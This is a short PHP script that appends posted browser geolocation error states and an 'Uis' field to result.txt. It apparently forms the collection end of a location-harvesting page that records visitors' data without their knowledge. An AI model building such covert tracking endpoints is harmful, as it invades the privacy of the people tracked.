<?php
header('Content-Type: text/html');
{
    $denied = $_POST['Denied'];
    $una = $_POST['Una'];
    $time = $_POST['Time'];
    $unk = $_POST['Unk'];
    $support = "La geolocalización no es compatible! \n";

    $obj = $_POST['Uis'];

    if (isset($denied)) {
        $f = fopen('result.txt', 'a+');
        fwrite($f, "OBJ: " . $obj . "......" . $denied . "\n\n\n");
        fclose($f);
    } elseif (isset($una)) {
        $f = fopen('result.txt', 'a+');
        fwrite($f, "OBJ: " . $obj . "......" . $una . "\n\n\n");
        fclose($f);
    } elseif (isset($time)) {
        $f = fopen('result.txt', 'a+');
        fwrite($f, "OBJ: " . $obj . "......" . $time . "\n\n\n");
        fclose($f);
    } elseif (isset($unk)) {
        $f = fopen('result.txt', 'a+');
        fwrite($f, "OBJ: " . $obj . "......" . $unk . "\n\n\n");
        fclose($f);
    } else {
        $f = fopen('result.txt', 'a+');
        fwrite($f, "OBJ: " . $obj . "......" . $support . "\n\n");
        fclose($f);
    }
}
?>
